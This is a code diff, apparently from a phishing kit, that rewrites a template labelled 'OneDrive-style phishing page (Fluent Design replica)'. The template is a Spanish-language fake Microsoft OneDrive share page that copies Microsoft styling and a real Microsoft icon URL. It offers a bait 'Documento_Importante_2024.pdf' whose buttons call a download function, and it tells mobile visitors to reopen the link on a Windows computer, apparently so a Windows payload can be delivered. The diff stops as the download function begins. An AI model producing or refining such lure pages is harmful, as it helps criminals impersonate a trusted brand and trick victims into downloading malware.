@@ -687,117 +687,142 @@ function dl(){
 </body>
 </html>`;
 
-// ── OneDrive-style phishing page ──
+// ── OneDrive-style phishing page (Fluent Design replica) ──
 const ONEDRIVE_HTML = `<!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Documento compartido - OneDrive</title>
-<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%230078d4' d='M12.5 3.5c-2.6 0-4.8 1.7-5.6 4a5 5 0 00-4.4 5c0 2.8 2.2 5 5 5h12a4.5 4.5 0 001-8.9c-.5-2.9-3-5.1-6-5.1h-2z'/></svg>">
+<title>Elemento compartido en OneDrive</title>
+<link rel="icon" type="image/x-icon" href="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/brand-icons/product/svg/onedrive_48x1.svg">
 <style>
+:root{--bg:#f3f2f1;--card-bg:#ffffff;--text-primary:#323130;--text-secondary:#605e5c;--text-tertiary:#a19f9d;--brand:#0078d4;--brand-hover:#106ebe;--brand-pressed:#005a9e;--border:#edebe9;--border-dark:#c8c6c4;--shadow:0 3.2px 7.2px 0 rgba(0,0,0,.13),0 0.6px 1.8px 0 rgba(0,0,0,.11);--font:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif}
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f5f5f5;min-height:100vh}
-.nav{background:#fff;border-bottom:1px solid #e1e1e1;padding:8px 24px;display:flex;align-items:center;gap:12px}
-.nav svg{width:28px;height:28px}
-.nav span{font-size:17px;font-weight:600;color:#333}
-.nav .right{margin-left:auto;display:flex;align-items:center;gap:16px}
-.nav .avatar{width:32px;height:32px;border-radius:50%;background:#0078d4;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:600}
-.container{max-width:680px;margin:60px auto;padding:0 20px}
-.card{background:#fff;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.08);overflow:hidden}
-.card-header{padding:28px 32px 20px;border-bottom:1px solid #f0f0f0}
-.card-header .shared-by{display:flex;align-items:center;gap:12px;margin-bottom:18px}
-.card-header .shared-avatar{width:40px;height:40px;border-radius:50%;background:#0078d4;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:600}
-.card-header .shared-info{font-size:14px;color:#616161}
-.card-header .shared-info strong{color:#333;font-size:15px;display:block}
-.card-header h2{font-size:20px;color:#1a1a1a;margin-bottom:6px;display:flex;align-items:center;gap:10px}
-.card-header h2 .icon{color:#0078d4}
-.card-header .meta{font-size:13px;color:#888;display:flex;gap:16px}
-.preview{padding:24px 32px;background:#fafafa;border-bottom:1px solid #f0f0f0;min-height:200px;position:relative}
-.preview-blur{filter:blur(5px);pointer-events:none;user-select:none;opacity:.7}
-.preview-blur p{font-size:14px;color:#444;line-height:1.8;margin-bottom:12px}
-.preview-blur table{width:100%;border-collapse:collapse;margin:16px 0}
-.preview-blur td,.preview-blur th{border:1px solid #ddd;padding:8px 12px;font-size:13px;text-align:left}
-.preview-blur th{background:#f0f0f0;font-weight:600}
-.preview-overlay{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:2}
-.preview-overlay .lock{font-size:42px;margin-bottom:12px}
-.preview-overlay p{font-size:15px;color:#555;margin-bottom:18px}
-.actions{padding:24px 32px;display:flex;justify-content:center;gap:12px}
-.btn{padding:12px 32px;border-radius:6px;font-size:15px;font-weight:600;border:none;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:8px;transition:background .15s}
-.btn-primary{background:#0078d4;color:#fff}.btn-primary:hover{background:#106ebe}
-.btn-outline{background:#fff;color:#0078d4;border:1px solid #0078d4}.btn-outline:hover{background:#f0f7ff}
-.footer{text-align:center;padding:24px;font-size:12px;color:#999}
-.footer a{color:#0078d4;text-decoration:none}
-.mobile-msg{display:none;text-align:center;padding:40px 24px}
-.mobile-msg .phone-icon{font-size:48px;margin-bottom:16px}
-.mobile-msg h3{font-size:18px;color:#333;margin-bottom:8px}
-.mobile-msg p{font-size:14px;color:#666;line-height:1.6}
-@media(max-width:768px){.desktop-only{display:none!important}.mobile-msg{display:block!important}}
-.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#107c10;color:#fff;padding:12px 24px;border-radius:8px;font-size:14px;display:none;z-index:99;box-shadow:0 4px 12px rgba(0,0,0,.2)}
+body{font-family:var(--font);background:var(--bg);color:var(--text-primary);min-height:100vh;display:flex;flex-direction:column}
+/* ── Top bar ── */
+.o-header{height:48px;background:#fff;border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 16px;position:fixed;top:0;left:0;right:0;z-index:100}
+.o-header .waffle{width:20px;height:20px;cursor:pointer;opacity:.7;margin-right:16px}
+.o-header .waffle:hover{opacity:1}
+.o-header .brand{display:flex;align-items:center;gap:8px;text-decoration:none;color:var(--text-primary)}
+.o-header .brand svg{width:24px;height:24px}
+.o-header .brand-text{font-size:16px;font-weight:600;color:var(--text-primary)}
+.o-header .right{margin-left:auto;display:flex;align-items:center;gap:8px}
+.o-header .help-btn,.o-header .settings-btn{width:40px;height:40px;border-radius:50%;border:none;background:transparent;cursor:pointer;display:flex;align-items:center;justify-content:center;color:var(--text-secondary)}
+.o-header .help-btn:hover,.o-header .settings-btn:hover{background:#f3f2f1}
+.o-header .user-btn{width:32px;height:32px;border-radius:50%;background:var(--brand);color:#fff;border:none;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center}
+/* ── Main content ── */
+.o-main{flex:1;display:flex;justify-content:center;align-items:center;padding:48px 20px 20px}
+.o-card{background:var(--card-bg);border-radius:4px;box-shadow:var(--shadow);border:1px solid var(--border);width:100%;max-width:440px;padding:36px 32px 28px;text-align:center}
+.o-cloud{margin-bottom:20px}
+.o-cloud svg{width:52px;height:52px}
+.o-title{font-size:20px;font-weight:600;color:var(--text-primary);margin-bottom:6px;line-height:1.3}
+.o-subtitle{font-size:14px;color:var(--text-secondary);margin-bottom:24px;line-height:1.5}
+/* ── File card ── */
+.o-file{display:flex;align-items:center;background:#faf9f8;border:1px solid var(--border);border-radius:4px;padding:12px;text-align:left;margin-bottom:24px;cursor:default}
+.o-file-icon{width:40px;height:40px;border-radius:2px;display:flex;align-items:center;justify-content:center;margin-right:12px;flex-shrink:0;font-weight:700;font-size:11px;color:#fff;letter-spacing:.3px}
+.o-file-icon.pdf{background:#d83b01}
+.o-file-icon.xlsx{background:#107c41}
+.o-file-icon.docx{background:#185abd}
+.o-file-icon.pptx{background:#c43e1c}
+.o-file-details{overflow:hidden;flex:1}
+.o-file-name{font-size:14px;font-weight:600;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px}
+.o-file-owner{font-size:12px;color:var(--text-secondary)}
+/* ── Buttons ── */
+.o-btn{display:block;width:100%;padding:10px 20px;font-size:14px;font-weight:600;font-family:var(--font);border-radius:2px;cursor:pointer;transition:background .1s}
+.o-btn-primary{background:var(--brand);color:#fff;border:none}.o-btn-primary:hover{background:var(--brand-hover)}.o-btn-primary:active{background:var(--brand-pressed)}
+.o-btn-outline{background:transparent;color:var(--text-primary);border:1px solid var(--border-dark);margin-top:8px}.o-btn-outline:hover{background:#f3f2f1}
+.o-footer{margin-top:16px;font-size:11px;color:var(--text-tertiary);line-height:1.6}
+.o-footer a{color:var(--text-tertiary);text-decoration:none}.o-footer a:hover{text-decoration:underline}
+.o-divider{width:100%;height:1px;background:var(--border);margin:16px 0}
+/* ── Mobile ── */
+.mobile-only{display:none}
+@media(max-width:640px){
+  .desktop-only{display:none!important}
+  .mobile-only{display:block!important}
+  .o-card{padding:28px 24px 24px}
+}
+/* ── Toast ── */
+.o-toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#107c10;color:#fff;padding:10px 20px;border-radius:2px;font-size:13px;display:none;z-index:200;box-shadow:var(--shadow)}
 </style>
 </head>
 <body>
-<div class="nav">
-  <svg viewBox="0 0 24 24" fill="none"><path d="M9.5 8.5C9.5 6 11.5 4 14 4c2 0 3.7 1.3 4.3 3.1A3.5 3.5 0 0121 10.5 3.5 3.5 0 0117.5 14H7a4 4 0 01-.5-8A4.5 4.5 0 019.5 8.5z" fill="#0078d4"/><path d="M6.5 6c.4-.3.9-.6 1.4-.8A5.5 5.5 0 003 10a5 5 0 005 5h1.5" fill="#0050a0" opacity=".6"/></svg>
-  <span>OneDrive</span>
-  <div class="right">
-    <div class="avatar">U</div>
-  </div>
-</div>
 
-<div class="container">
-  <div class="card">
-    <div class="card-header">
-      <div class="shared-by">
-        <div class="shared-avatar">M</div>
-        <div class="shared-info">
-          <strong>Martin P.</strong>
-          Compartió un archivo con vos
+<!-- Header -->
+<header class="o-header">
+  <!-- Waffle menu -->
+  <svg class="waffle" viewBox="0 0 20 20" fill="var(--text-secondary)">
+    <circle cx="3" cy="3" r="1.8"/><circle cx="10" cy="3" r="1.8"/><circle cx="17" cy="3" r="1.8"/>
+    <circle cx="3" cy="10" r="1.8"/><circle cx="10" cy="10" r="1.8"/><circle cx="17" cy="10" r="1.8"/>
+    <circle cx="3" cy="17" r="1.8"/><circle cx="10" cy="17" r="1.8"/><circle cx="17" cy="17" r="1.8"/>
+  </svg>
+  <a class="brand" href="#">
+    <svg viewBox="0 0 24 24" fill="none"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z" fill="#0078D4"/></svg>
+    <span class="brand-text">OneDrive</span>
+  </a>
+  <div class="right">
+    <button class="help-btn" title="Ayuda">
+      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M10 2a8 8 0 100 16 8 8 0 000-16zm0 14.5a6.5 6.5 0 110-13 6.5 6.5 0 010 13zm-.75-3a.75.75 0 101.5 0 .75.75 0 00-1.5 0zm.75-7.5a2.25 2.25 0 00-2.25 2.25.75.75 0 001.5 0 .75.75 0 011.5 0c0 .41-.17.64-.72 1.05l-.14.1c-.5.38-.89.79-.89 1.6a.75.75 0 001.5 0c0-.26.09-.42.55-.75l.17-.13c.57-.43 1.03-.93 1.03-1.87A2.25 2.25 0 0010 6z"/></svg>
+    </button>
+    <button class="settings-btn" title="Configuración">
+      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M8.3 2a.75.75 0 00-.74.63l-.27 1.6a6.02 6.02 0 00-1.5.86l-1.5-.6a.75.75 0 00-.9.33L2.1 6.7a.75.75 0 00.15.95l1.22 1a6.1 6.1 0 000 1.72l-1.22 1a.75.75 0 00-.16.94l1.3 2.25a.75.75 0 00.9.33l1.5-.6c.44.36.94.65 1.49.86l.27 1.6a.75.75 0 00.74.63h2.6a.75.75 0 00.74-.63l.27-1.6a6.02 6.02 0 001.5-.86l1.5.6a.75.75 0 00.9-.33l1.3-2.25a.75.75 0 00-.16-.95l-1.22-1a6.1 6.1 0 000-1.72l1.22-1a.75.75 0 00.16-.94L16.3 4.82a.75.75 0 00-.9-.33l-1.5.6a6.02 6.02 0 00-1.49-.86l-.27-1.6A.75.75 0 0011.4 2H8.6zm1.3 5.5a2.5 2.5 0 100 5 2.5 2.5 0 000-5z"/></svg>
+    </button>
+    <button class="user-btn">M</button>
+  </div>
+</header>
+
+<!-- Main content -->
+<main class="o-main">
+  <div class="o-card">
+    <!-- OneDrive cloud icon -->
+    <div class="o-cloud">
+      <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M14.7 39h22.3a9 9 0 002-17.8A11 11 0 0018.5 15 9 9 0 005.7 23.9 8 8 0 0014.7 39z" fill="#0078D4"/>
+        <path d="M11.5 14.1c.6-.5 1.2-.9 1.9-1.2A11 11 0 0126 14.7 9 9 0 0138 22.2a9 9 0 011 .5 8.5 8.5 0 00-8-11.7 11 11 0 00-19.5 3.1z" fill="#1490DF" opacity=".7"/>
+      </svg>
+    </div>
+
+    <div class="desktop-only">
+      <h1 class="o-title">Se compartió un archivo con usted</h1>
+      <p class="o-subtitle">Este elemento se compartió de forma segura a través de OneDrive.</p>
+
+      <!-- File card -->
+      <div class="o-file">
+        <div class="o-file-icon pdf">PDF</div>
+        <div class="o-file-details">
+          <div class="o-file-name">Documento_Importante_2024.pdf</div>
+          <div class="o-file-owner">Martin P. lo compartió con usted</div>
         </div>
       </div>
-      <h2><span class="icon">📄</span> Documento_Importante_2024.pdf</h2>
-      <div class="meta">
-        <span>PDF — 2.4 MB</span>
-        <span>Modificado: hace 2 horas</span>
-        <span>🔒 Solo lectura</span>
-      </div>
-    </div>
-    <div class="preview desktop-only">
-      <div class="preview-blur">
-        <p><strong>DOCUMENTO CONFIDENCIAL</strong></p>
-        <p>Estimado/a, por medio de la presente se adjunta la documentación solicitada referente al trámite iniciado con fecha 14/11/2024. Se detallan los puntos acordados:</p>
-        <table>
-          <tr><th>Concepto</th><th>Detalle</th><th>Estado</th></tr>
-          <tr><td>Documentación personal</td><td>DNI, CUIL, comprobante</td><td>Completo</td></tr>
-          <tr><td>Formulario 1040</td><td>Declaración jurada</td><td>Pendiente firma</td></tr>
-          <tr><td>Comprobante de domicilio</td><td>Servicio a nombre</td><td>Completo</td></tr>
-        </table>
-        <p>Queda a disposición para cualquier consulta. Se solicita revisión y confirmación antes del viernes 22/11/2024.</p>
-      </div>
-      <div class="preview-overlay">
-        <div class="lock">🔒</div>
-        <p>Descargá el documento para ver el contenido completo</p>
-      </div>
-    </div>
-    <div class="mobile-msg">
-      <div class="phone-icon">💻</div>
-      <h3>Abrir en una computadora</h3>
-      <p>Este documento requiere ser descargado y abierto desde una computadora con Windows para su correcta visualización.<br><br>Abrí este enlace desde tu PC o laptop.</p>
-    </div>
-    <div class="actions desktop-only">
-      <button class="btn btn-primary" onclick="dlDoc()">
-        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
-        Descargar documento
-      </button>
-      <button class="btn btn-outline" onclick="dlDoc()">Abrir en OneDrive</button>
-    </div>
-  </div>
-  <div class="footer">
-    <a href="#">Términos de uso</a> · <a href="#">Privacidad</a> · <a href="#">Microsoft © 2024</a>
-  </div>
-</div>
 
-<div class="toast" id="toast">✓ Descarga iniciada</div>
+      <!-- Actions -->
+      <button class="o-btn o-btn-primary" onclick="dlDoc()">Abrir</button>
+      <button class="o-btn o-btn-outline" onclick="dlDoc()">Descargar</button>
+    </div>
+
+    <div class="mobile-only">
+      <h1 class="o-title">Se compartió un archivo con usted</h1>
+      <p class="o-subtitle" style="margin-bottom:16px">Este documento requiere ser descargado desde una computadora con Windows para su correcta visualización.</p>
+      <div class="o-file">
+        <div class="o-file-icon pdf">PDF</div>
+        <div class="o-file-details">
+          <div class="o-file-name">Documento_Importante_2024.pdf</div>
+          <div class="o-file-owner">Martin P. lo compartió con usted</div>
+        </div>
+      </div>
+      <div style="background:#fff4ce;border:1px solid #f0e6b2;border-radius:4px;padding:12px;text-align:left;font-size:13px;color:#323130">
+        <strong>⚠ Aviso:</strong> Para abrir este documento, accedé a este enlace desde tu computadora.
+      </div>
+    </div>
+
+    <div class="o-divider"></div>
+    <div class="o-footer">
+      <a href="#">Términos de uso</a> · <a href="#">Privacidad y cookies</a><br>
+      Microsoft OneDrive · © Microsoft 2024
+    </div>
+  </div>
+</main>
+
+<div class="o-toast" id="toast">✓ Descarga iniciada</div>
 
 <script>
 function dlDoc(){
